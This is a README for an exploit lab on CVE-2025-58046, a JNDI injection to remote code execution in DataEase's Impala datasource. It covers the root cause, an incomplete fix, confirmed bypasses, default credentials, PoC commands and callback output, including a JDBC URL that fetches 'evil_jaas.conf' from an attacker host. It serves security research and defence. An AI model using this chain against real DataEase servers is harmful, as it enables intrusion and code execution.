# CVE-2025-58046 - DataEase Impala JNDI Injection to Remote Code Execution

> **Exploit Intelligence Platform** | [exploit-intel.com](https://exploit-intel.com) | [@exploit_intel](https://x.com/exploit_intel)

## Vulnerability Summary

| Field | Value |
|---|---|
| CVE | CVE-2025-58046 |
| Component | [DataEase](https://github.com/dataease/dataease) |
| Type | CWE-502: Deserialization of Untrusted Data / CWE-74: Injection |
| CVSS | 9.8 (Critical) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| EPSS | 1.1% (77.5th percentile) |
| Affected | DataEase ≤ 2.10.12 |
| Fix | v2.10.13 — commit [`7707865`](https://github.com/dataease/dataease/commit/77078658715bd85af5867afbfd5f1fcc37cf03c8) (incomplete — only patches Impala and Db2) |
| Author | Exploit Intelligence Platform |
| Date | 2025-09-15 |

## Vulnerability Details

DataEase versions ≤ 2.10.12 are vulnerable to **Remote Code Execution (RCE)** via JNDI injection through the Impala datasource JDBC connection string. The `Impala.getJdbc()` method fails to validate user-supplied JDBC URL parameters against its own blocklist, allowing an attacker to inject the `krbJAASFile` parameter pointing to a malicious JAAS configuration file. This triggers a JNDI deserialization chain that achieves arbitrary code execution on the server.

The vulnerability is exploitable by any authenticated user — and since DataEase ships with well-known default credentials (`admin` / `DataEase@123456`), it is effectively unauthenticated on default installations.

The `Impala.getJdbc()` method contains an `illegalParameters` blocklist that is **dead code** — it is never checked in any code path. Two independent injection points exist:

**1. Custom JDBC URL path (`urlType = "jdbcUrl"`):** When the user sets `urlType` to `"jdbcUrl"`, the method returns the raw user-supplied `jdbcUrl` field after only verifying it starts with `"jdbc:impala"`. The `illegalParameters` list is never consulted.

**2. Hostname mode with `extraParams`:** When `urlType` is `"hostName"` and `extraParams` is non-empty, the extra parameters are concatenated directly into the constructed JDBC URL without any validation.

Once the JAAS configuration file is loaded, it specifies `com.sun.security.auth.module.JndiLoginModule` with an RMI provider URL pointing to an attacker-controlled server. The RMI server delivers a deserialization gadget chain (AspectJWeaver is confirmed in the DataEase classpath) that achieves arbitrary file write or command execution.

### Attack Chain

```
1. Attacker authenticates (default creds: admin / DataEase@123456)
2. POST /de2api/datasource/validate with crafted Impala datasource config
3. Config contains krbJAASFile=http://ATTACKER/evil_jaas.conf in JDBC URL
4. Impala.getJdbc() returns the URL unfiltered (blocklist is dead code)
5. JDBC driver fetches remote JAAS config via HTTP
6. JAAS config specifies JndiLoginModule → JNDI lookup to attacker RMI server
7. RMI server delivers deserialization payload → RCE
```

### Fix (Commit 7707865)

The fix commit modifies `Impala.java` and `Db2.java`:

1. **Expanded blocklist**: Added 12 new parameters to `illegalParameters`: `krbJAASFile`, `KrbJAASFile`, `krb5.conf`, `Krb5Conf`, `jndi`, `JNDI`, `java.naming.factory.initial`, `java.naming.provider.url`, `connectionProperties`, `ConnectionProperties`, `initSQL`, `InitSQL`
2. **Custom JDBC URL path now validated**: The blocklist is checked before returning `getJdbcUrl()`
3. **Hostname path now validated**: URL is checked against the blocklist after construction
4. **URL decoding**: `URLDecoder.decode()` is applied before checking, preventing URL-encoded bypasses

**Assessment:** The fix is **incomplete**. It only patches `Impala.java` and `Db2.java`, but the identical vulnerability pattern exists in `CK.java` (ClickHouse), `Sqlserver.java`, `Oracle.java`, and others — all unpatched in v2.10.13. See `bypass_analysis.md` for details.

## Lab Setup

### Architecture

```
┌──────────────────────────────────────────────────────────────────┐
│  cve-2025-58046-net (bridge)                                     │
│                                                                  │
│  ┌─────────────────────┐    ┌────────────────────────────────┐   │
│  │ cve-2025-58046-mysql│    │ cve-2025-58046-dataease        │   │
│  │ MySQL 8.4.5         │◄───│ DataEase v2.10.12 (vulnerable) │   │
│  │ Port: 3306          │    │ Port: 8100 (host: 18100)       │   │
│  └─────────────────────┘    └────────────────────────────────┘   │
│                              ┌────────────────────────────────┐   │
│                              │ cve-2025-58046-patched         │   │
│                              │ DataEase v2.10.13 (patched)    │   │
│                              │ Port: 8100 (host: 18101)       │   │
│                              └────────────────────────────────┘   │
└──────────────────────────────────────────────────────────────────┘
```

### Quick Start

```bash
cd CVE-2025-58046

# Build and start (requires access to registry.cn-qingdao.aliyuncs.com)
docker compose build
docker compose up -d

# Wait ~60-90s for DataEase to initialize, then run the exploit
DATAEASE_IP=$(docker inspect cve-2025-58046-dataease --format '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}')
CALLBACK_IP=$(hostname -I | awk '{print $1}')
python3 poc/poc.py "$DATAEASE_IP" 8100 "$CALLBACK_IP"

# Cleanup
docker compose down
```

### Container Details

| Container | Role | Base | Host Port | Description |
|---|---|---|---|---|
| `cve-2025-58046-mysql` | Database | `dataease/mysql:8.4.5` | — (internal) | MySQL 8.4 metadata store |
| `cve-2025-58046-dataease` | Vulnerable target | `dataease/dataease:v2.10.12` | `18100` | DataEase v2.10.12 (vulnerable) |
| `cve-2025-58046-patched` | Patched target | `dataease/dataease:v2.10.13` | `18101` | DataEase v2.10.13 (bypass confirmed) |

### Default Credentials

| Service | Username | Password |
|---|---|---|
| DataEase admin | `admin` | `DataEase@123456` |
| MySQL root | `root` | `Password123@mysql` |

## PoC Usage

### Install Dependencies

```bash
pip install pycryptodome
```

### Vector 1: Custom JDBC URL Injection (Primary)

This exploits the `urlType="jdbcUrl"` code path where the full JDBC URL is returned without blocklist validation.

```bash
python3 poc/poc.py <target_host> <target_port> <callback_host>

# Lab example (using container IPs)
python3 poc/poc.py 172.25.0.3 8100 172.25.0.4

# Lab example (from host)
python3 poc/poc.py localhost 18100 <YOUR_HOST_IP>
```

### Vector 2: Hostname + extraParams Injection

```bash
python3 poc/poc_vector2.py <target_host> <target_port> <callback_host>
```

### Expected Output (Vulnerable — v2.10.12)

```
======================================================================
  CVE-2025-58046: DataEase Impala JNDI Injection PoC
  Target:   172.25.0.3:8100
  Callback: 172.25.0.4
======================================================================

[*] PHASE 1: Authentication
[+] Authentication successful! Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...

[*] PHASE 2: Starting callback servers
[+] Fake Impala TCP server started on 0.0.0.0:21050
[+] HTTP callback server started on 0.0.0.0:8888
[+] RMI/JNDI listener started on 0.0.0.0:1099

[*] PHASE 3: Sending exploit payload
[*] Malicious JDBC URL: jdbc:impala://172.25.0.4:21050/default;...;krbJAASFile=http://172.25.0.4:8888/evil_jaas.conf

[!] *** HTTP CALLBACK RECEIVED ***
[!] Client: 172.25.0.3:59224
[!] Path: /evil_jaas.conf
[!] User-Agent: Java/21.0.6
[+] Served malicious JAAS config

======================================================================
  VERDICT: VULNERABLE (CVE-2025-58046 confirmed)
  The krbJAASFile parameter in Impala JDBC URLs is not filtered,
  allowing attacker-controlled remote file fetch (SSRF/JNDI injection).
======================================================================
```

## Verification: Vulnerable vs Patched

| Behavior | Vulnerable (v2.10.12) | Patched (v2.10.13) |
|---|---|---|
| `krbJAASFile` in JDBC URL | Passed through unfiltered | Blocked by expanded `illegalParameters` list |
| `illegalParameters` checked | Never (dead code) | Checked in all code paths |
| HTTP callback received | DataEase fetches remote JAAS config | Connection rejected before URL reaches driver |
| URL-encoded bypass | Would work (no decode) | `URLDecoder.decode()` applied before check |
| PoC verdict | `VULNERABLE` | `NOT VULNERABLE` (for Impala only) |

### Bypass: Patched Version Still Exploitable

The fix only patches `Impala.java` and `Db2.java`. Two bypass vectors were confirmed against v2.10.13:

| Bypass Vector | Datasource Type | Result |
|---|---|---|
| **ClickHouse (CK)** — HTTP-based SSRF | `ck` | Bypass confirmed — no blocklist at all |
| **SQL Server** — Dead-code blocklist | `sqlServer` | Bypass confirmed — blocklist never checked |
| **Mongo** — MySQL JDBC injection | `mongo` | Blocked (accidentally protected by CalciteProvider mapping) |

See `bypass_analysis.md` and `poc/bypass_poc.py` for full details.

## Related Attack Surface

The identical vulnerability pattern exists in unpatched sibling datasource classes:

| Datasource | File | Severity | Notes |
|---|---|---|---|
| SQL Server | `Sqlserver.java` | CRITICAL | `illegalParameters` exists but is dead code |
| ClickHouse | `CK.java` | CRITICAL | No blocklist at all; JDBC URL returned unfiltered |
| Oracle | `Oracle.java` | HIGH | No blocklist; custom URL path unvalidated |
| MongoDB | `Mongo.java` | HIGH | Blocklist not checked in custom URL path |
| H2 | `H2.java` | MEDIUM | No URL decoding before `INIT`/`RUNSCRIPT` check |

## Files

| File | Description |
|---|---|
| `poc/poc.py` | Primary PoC — Vector 1: custom JDBC URL injection (`pycryptodome` required) |
| `poc/poc_vector2.py` | Vector 2: hostname + extraParams injection |
| `poc/bypass_poc.py` | Fix bypass — exploits unpatched CK/SQLServer datasource types on v2.10.13 |
| `Dockerfile.vulnerable` | DataEase v2.10.12 image |
| `Dockerfile.patched` | DataEase v2.10.13 image (bypass target) |
| `Dockerfile.mysql` | MySQL 8.4 with custom config and init script |
| `docker-compose.yml` | Container orchestration (vulnerable + patched + MySQL) |
| `conf/application.yml` | DataEase Spring Boot config override |
| `conf/my.cnf` | MySQL configuration |
| `init.sql` | Database initialization script |
| `intel_brief.md` | CVE intelligence brief |
| `vulnerability_analysis.md` | Root cause analysis |
| `lab_build_report.md` | Lab build documentation |
| `poc_verification_report.md` | PoC test results |
| `bypass_analysis.md` | Bypass findings against v2.10.13 |

## References

- [GitHub Advisory GHSA-mvwc-x8x9-46c3](https://github.com/dataease/dataease/security/advisories/GHSA-mvwc-x8x9-46c3)
- [Fix Commit (Impala + Db2)](https://github.com/dataease/dataease/commit/77078658715bd85af5867afbfd5f1fcc37cf03c8)
- [Earlier Db2-only Fix](https://github.com/dataease/dataease/commit/8d04e92d44e1bac9284e9e64df5afd7f96d9373c)
- [DataEase Repository](https://github.com/dataease/dataease)
- [v2.10.12 Release (vulnerable)](https://github.com/dataease/dataease/releases/tag/v2.10.12)
- [v2.10.13 Release (patched)](https://github.com/dataease/dataease/releases/tag/v2.10.13)
- [NVD Entry](https://nvd.nist.gov/vuln/detail/CVE-2025-58046)

## Timeline

| Date | Event |
|---|---|
| 2025-08-05 | Partial fix for Db2 datasource (commit `8d04e92`) |
| 2025-09-01 | Fix commit for Impala + Db2 (commit `7707865`) |
| 2025-09-15 | CVE-2025-58046 published (NVD) |
| 2025-09-15 | GitHub Security Advisory GHSA-mvwc-x8x9-46c3 published |

## Disclaimer

This proof-of-concept is provided for **authorized security testing and educational purposes only**. It is intended to help defenders understand, detect, and remediate CVE-2025-58046 in their environments.

**Do not** use this tool against systems you do not own or have explicit written authorization to test. Unauthorized access to computer systems is illegal in most jurisdictions and may violate laws including the Computer Fraud and Abuse Act (CFAA), the Computer Misuse Act, and equivalent legislation worldwide.

The authors assume no liability for misuse of this material. This project follows responsible disclosure practices.
